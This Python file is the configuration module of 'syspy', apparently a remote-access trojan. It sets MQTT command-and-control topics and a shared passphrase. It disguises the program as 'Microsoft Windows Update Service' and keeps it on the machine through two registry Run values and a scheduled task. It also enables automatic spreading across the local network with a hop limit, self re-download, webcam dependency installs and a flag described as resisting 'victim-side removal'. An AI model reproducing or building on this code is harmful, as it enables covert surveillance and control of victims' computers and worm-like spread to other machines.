from __future__ import annotations

import os
import re
import socket
import uuid
import sys as _sys
from . import __version__ as PRODUCT_VERSION  # noqa: F401
import json as _json
import secrets

# --------------------------------------------------------------------------
# Identity of this deployment
# --------------------------------------------------------------------------

#: MQTT topic prefix.  Make this unique or strangers will see your traffic.
ROOM = os.environ.get("SYSPY_ROOM", "syspy-delta-7421")

#: Pre-shared passphrase.  Both sides derive the same key from it.
PASSPHRASE = os.environ.get("SYSPY_PASS", "k9Xq2-venice-syspy")

#: MQTT broker authentication – user and password for the sole broker.
SYSPY_BROKER_USER = os.environ.get("SYSPY_BROKER_USER", "")
SYSPY_BROKER_PASS = os.environ.get("SYSPY_BROKER_PASS", "")

#: Salt mixed into the key derivation.  Changing it invalidates all peers.
KEY_SALT = b"syspy/v3/transport"

# --------------------------------------------------------------------------
# Transport
# --------------------------------------------------------------------------

#: Public brokers, tried in order.  ``(host, port, use_tls)``.
# Default is empty – the deployment must set SYSPY_BROKER env or use the
# self‑hosted EMQX Cloud endpoint.  This removes the insecure public broker.
BROKERS: list[tuple[str, int, bool]] = []
MQTT_KEEPALIVE = 30
MQTT_RECONNECT_DELAY = 5.0

#: Maximum bytes per chunk when splitting large payloads (32 KB safe under 64 KB public MQTT limits).
CHUNK_SIZE = 32_000

#: Automatically install missing dependencies on demand (e.g. OpenCV for webcam).
AUTO_INSTALL_DEPS = True

#: Seconds between telemetry pushes.
TELEMETRY_INTERVAL = 3.0

#: Seconds between agent heartbeats.
HEARTBEAT_INTERVAL = 10.0

#: Seconds before the controller considers an agent gone.
AGENT_TIMEOUT = 45.0

# --------------------------------------------------------------------------
# Dashboard
# --------------------------------------------------------------------------

DASHBOARD_HOST = os.environ.get("SYSPY_HOST", "127.0.0.1")
DASHBOARD_PORT = 8787

# --------------------------------------------------------------------------
# Naming / camouflage
# --------------------------------------------------------------------------

#: Name used for the executable, the scheduled task and the registry value.
PRODUCT_NAME = "WindowsUpdateService"

#: Human readable description shown in Task Manager / service lists.
PRODUCT_DESCRIPTION = "Microsoft Windows Update Service"

#: Sub-path used under the standard Windows data folders.
WINDOWS_SUBDIR = os.path.join("Microsoft", "WindowsUpdate")

#: Folder used on Linux/macOS.
UNIX_SUBDIR = os.path.join(".local", "share", "windows-update-service")

#: Registry value names that point at us.  Two independent names is one more
#: thing an uninstaller has to find.
RUN_VALUE_NAMES = ("WindowsUpdateService", "WindowsUpdateServiceBoot")

#: Scheduled task name.
TASK_NAME = "WindowsUpdateService"

#: Optional.  If set, the agent re-downloads itself when every copy is gone.
REMOTE_URL = ""

# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------

IS_WINDOWS = os.name == "nt"
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

PUBLIC_URL = os.environ.get("SYSPY_URL", "").rstrip('/')
EMBED_VERSION = "3.12.8"

LAN_ENABLED = os.environ.get("SYSPY_LAN", "1") != "0"
LAN_PORT = int(os.environ.get("SYSPY_LAN_PORT", "8788"))
LAN_HTTP_PORT = int(os.environ.get("SYSPY_KIT_PORT", "8789"))
LAN_BEACON_INTERVAL = 10.0
LAN_PEER_TTL = 45.0

SPREAD_ENABLED = os.environ.get("SYSPY_SPREAD", "1") != "0"
SPREAD_INTERVAL = 120.0
SPREAD_INSTALL_TIMEOUT = 300.0
HOP_LIMIT = int(os.environ.get("SYSPY_HOP_LIMIT", "3"))

DEP_INSTALL_TIMEOUT = 900

GROUP = os.environ.get("SYSPY_GROUP", "")

# Default is empty for self-hosted broker setup (Mosquitto/EMQX Cloud).
# Deployment must set SYSPY_BROKER=host:port:tls env var (e.g. localhost:8883:1).
BROKERS: list[tuple[str, int, bool]] = []

# --------------------------------------------------------------------------
# Transport helpers (re‑added after the duplicate BROKERS line)
# --------------------------------------------------------------------------

def broker_order() -> list[tuple[str, int, bool]]:
    """Brokers to try in order.  SYSPY_BROKER=host:port:tls overrides."""
    override = os.environ.get("SYSPY_BROKER", "").strip()
    if override:
        host, _, rest = override.partition(":")
        port, _, tls = rest.partition(":")
        try:
            return [(host, int(port or "8883"), (tls or "1") != "0")]
        except ValueError:
            pass
    return list(BROKERS)

def topic_up(agent_id: str) -> str:
    """Agent -> controller.  The controller reads the id from the last segment."""
    return f"{ROOM}/up/{agent_id}"

def topic_down(agent_id: str) -> str:
    """Controller -> agent."""
    return f"{ROOM}/down/{agent_id}"

def protected() -> bool:
    """True when the install resists victim‑side removal."""
    return str(_deploy().get("protected", "1")) not in ("0", "False", "false")

_host_cache: dict = {}


def hostname() -> str:
    if "host" not in _host_cache:
        _host_cache["host"] = socket.gethostname()
    return _host_cache["host"]


def os_kind() -> str:
    if IS_WINDOWS:
        return "windows"
    return "darwin" if _sys.platform == "darwin" else "linux"


def _deploy_path() -> str:
    return os.environ.get("SYSPY_DEPLOY") or os.path.abspath(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "deploy.json"))


def _deploy() -> dict:
    if "deploy" not in _host_cache:
        path = _deploy_path()
        try:
            with open(path, "r", encoding="utf-8-sig") as handle:
                _host_cache["deploy"] = _json.load(handle) or {}
        except Exception:
            _host_cache["deploy"] = {}
        if not _host_cache["deploy"].get("salt"):
            _host_cache["deploy"]["salt"] = secrets.token_hex(4)
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as handle:
                    _json.dump(_host_cache["deploy"], handle, indent=1)
            except OSError:
                pass
    return _host_cache["deploy"]


def hop() -> int:
    try:
        return int(_deploy().get("hop") or 0)
    except Exception:
        return 0


def parent_id() -> str:
    return str(_deploy().get("parent") or "")


def parent_ip() -> str:
    return str(_deploy().get("parent_ip") or "")


def group() -> str:
    return str(_deploy().get("group") or GROUP)


def runtime_python(root: str = "") -> str:
    base = root or ROOT
    for name in ("pythonw.exe", "python.exe", "python3", "python"):
        candidate = os.path.join(base, "runtime", name)
        if os.path.exists(candidate):
            return candidate
    return ""


def short_id() -> str:
    import hashlib as _hashlib
    return _hashlib.sha256(agent_id().encode()).hexdigest()[:8]


def agent_id() -> str:
    host = re.sub(r"[^A-Za-z0-9_-]", "-", socket.gethostname())[:20] or "host"
    salt = str(_deploy().get("salt") or "")
    if not salt:
        salt = secrets.token_hex(4)
    return f"{host}-{salt}"


def mac() -> str:
    """First usable MAC address as uppercase colon-separated string."""
    if "mac" not in _host_cache:
        val = uuid.getnode()
        formatted = ":".join(("%012X" % val)[i:i+2] for i in range(0, 12, 2))
        _host_cache["mac"] = formatted
    return _host_cache["mac"]


def subnet() -> str:
    """Local IPv4 subnet in CIDR notation."""
    if "subnet" not in _host_cache:
        try:
            from .lan import discover as _disc
            _host_cache["subnet"] = _disc.local_subnet()
        except Exception:
            _host_cache["subnet"] = ""
    return _host_cache["subnet"]


# ---------------------------------------------------------------------------
# Deployment-supplied identity.
#
# MUST be the last block in this file: _deploy() has to already exist.
#
# install/i.ps1, syspy/server/webinstall.py and bootstrap.install() all write
# "room" and "pass" into deploy.json, but nothing ever read them back, so an
# operator who set SYSPY_ROOM split the fleet in half.  Precedence is
# env -> deploy.json -> built-in default.
#
# Do not move these above _deploy() and do not turn them into functions; the
# module-level names are read by topic_up/topic_down and by hub/webinstall.
# ---------------------------------------------------------------------------

def _setting(key: str, env: str, fallback: str) -> str:
    value = (os.environ.get(env) or "").strip()
    if value:
        return value
    try:
        return str(_deploy().get(key) or fallback)
    except Exception:
        return fallback


ROOM = _setting("room", "SYSPY_ROOM", ROOM)
PASSPHRASE = _setting("pass", "SYSPY_PASS", PASSPHRASE)


def controller_id() -> str:
    """Stable across restarts and redeploys.  A random id orphans the session."""
    env = (os.environ.get("SYSPY_CLIENT_ID") or "").strip()
    if env:
        return env
    path = os.path.join(os.environ.get("SYSPY_DATA") or ROOT, "controller-id")
    try:
        with open(path, "r", encoding="ascii") as handle:
            got = handle.read().strip()
            if got:
                return got
    except OSError:
        pass
    made = "syspy-c-" + secrets.token_hex(4)
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="ascii") as handle:
            handle.write(made)
    except OSError:
        pass
    return made
